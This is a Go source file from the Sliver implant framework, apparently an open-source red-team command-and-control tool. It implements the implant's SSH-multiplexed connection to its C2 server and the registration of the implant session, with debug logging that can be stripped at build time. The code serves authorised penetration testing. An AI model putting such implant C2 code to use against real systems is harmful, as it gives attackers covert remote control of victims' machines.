package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}
	"errors"
	"io"
	"net"
	"time"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// InitClient - Sets up and start a SSH connection (multiplexer) around a logical connection/stream, or a Session RPC.
func (m *Comm) InitClient(conn net.Conn, isTunnel bool, key []byte) (sessionStream io.ReadWriteCloser, err error) {
	// {{if .Config.Debug}}
	log.Printf("Initiating SSH client connection...")
	// {{end}}

	// Return if we don't have what we need.
	if conn == nil {
		return nil, errors.New("net.Conn is nil, cannot init Comm")
	}

	// Pepare the SSH conn/security, and set keepalive policies/handlers.
	err = m.Setup(false, key)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to setup SSH client connection: %s", err.Error())
		// {{end}}
		return nil, err
	}

	// We are the client of the C2 server here.
	m.sshConn, m.inbound, m.requests, err = ssh.NewClientConn(conn, "", m.clientConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to initiate SSH connection: %s", err.Error())
		// {{end}}
		return
	}

	// Serve pings & requests with keepalive policies, the same way for pivots or not.
	go m.serveRequests()

	// If the conn is not a tunnel, it means the session is not registered yet. Get and return a stream for this.
	if !isTunnel {
		sessionStream, err = m.initSessionClient()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to setup C2 stream: %s", err.Error())
			// {{end}}
			return
		}
	}

	// Everything is up and running, register the mux.
	Comms.Add(m)

	// Handle requests (pings) and incoming connections in the background.
	go m.serveActiveConnection()

	return
}

// initSessionClient - The multiplexer has just been created and set up, and we need to register
// the implant session for this physical connection. We create a dedicated stream and return it.
func (m *Comm) initSessionClient() (stream io.ReadWriteCloser, err error) {
	if m.sshConn == nil {
		// {{if .Config.Debug}}
		log.Printf("Tried to open channel on nil SSH connection")
		// {{end}}
		return
	}

	select {
	case ch := <-m.inbound:
		info := &sliverpb.ConnectionInfo{}
		proto.Unmarshal(ch.ExtraData(), info)

		if ch.ChannelType() != "session" || info.ID != "REGISTRATION" {
			err = ch.Reject(ssh.Prohibited, "")
			return nil, errors.New("Bad payload information for registration")
		}

		c2Stream, reqs, err := ch.Accept()
		if err != nil {
			return nil, err
		}
		go ssh.DiscardRequests(reqs)

		// {{if .Config.Debug}}
		log.Printf("Opened Session stream")
		// {{end}}

		stream = io.ReadWriteCloser(c2Stream)
		return stream, err

	case <-time.After(defaultNetTimeout):
		return nil, errors.New("[mux] timed out waiting muxed stream for RPC C2 layer")
	}
}
